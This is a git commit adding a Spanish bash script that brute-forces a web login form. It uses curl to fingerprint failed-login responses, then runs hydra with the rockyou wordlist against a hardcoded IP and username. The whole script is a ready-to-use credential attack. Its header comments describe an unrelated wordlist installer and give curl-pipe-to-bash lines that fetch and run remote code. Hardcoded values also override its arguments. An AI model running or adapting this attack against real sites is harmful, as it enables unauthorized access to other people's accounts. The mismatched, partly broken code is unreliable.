594d23ce342a7f5a5a206fca876f3ed7d425b52f
NiPeGun <nipegun@gmail.com>
2025-09-05 06:58:41 +0200

    Create hydra-POST.sh

---
+++ Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh
@@ -0,0 +1,57 @@
+#!/bin/bash
+
+# Pongo a disposición pública este script bajo el término de "software de dominio público".
+# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
+# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
+# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.
+
+# ----------
+# Script de NiPeGun para instalar la máxima cantidad posible de WordLists en texto plano en Debian
+#
+# Ejecución remota con parámetros (puede requerir permisos sudo):
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/WordLists/EnTextoPlano-Instalar.sh | bash -s '10.10.179.150' '/login' 'molly' '/home/user/Downloads/rockyou.txt''
+#
+# Ejecución remota como root (para sistemas sin sudo):
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/WordLists/EnTextoPlano-Instalar.sh | sed 's-sudo--g' | bash
+#
+# Bajar y editar directamente el archivo en nano
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/WordLists/EnTextoPlano-Instalar.sh | nano -
+# ----------
+
+vIP="$1"
+vSubURL="$2"
+vUsuario="$3"
+vUbicDicc="$4"
+
+
+vIP='10.10.179.150'
+vSubURL='/login'
+vUsuario='molly'
+vUbicDicc='/home/nipegun/Descargas/rockyou.txt'
+
+# Determinar el código de error
+  vErrorCode=$(curl -i -s -X POST -d 'username=NiPeGunXXX&password=NiPeGunXXX'   http://"$vIP""$vSubURL" | grep HTTP | grep Found | cut -d' ' -f2)
+  echo ""
+  echo ""
+  echo ""
+
+# Determinar el texto de error
+  vErrorText=$(curl -s -X POST -d 'username=NiPeGunXXX&password=NiPeGunXXX'   http://"$vIP""$vSubURL")
+
+# Mostrar mensajes con error
+  echo ""
+  echo "  El código que devuelve la web al introducir credenciales incorrectas es:"
+  echo ""
+  echo "    $vErrorCode"
+  echo ""
+  echo "  El texto que devuelve la web al introducir credenciales incorrectas es:"
+  echo ""
+  echo "    $vErrorText"
+  echo ""
+
+# Atacar
+  echo ""
+  echo "  Probando ataque de fuerza bruta..."
+  echo ""
+  sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:username=^USER^&password=^PASS^:S=$vErrorCode" -V
+  sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:username=^USER^&password=^PASS^:F=$vErrorText" -V
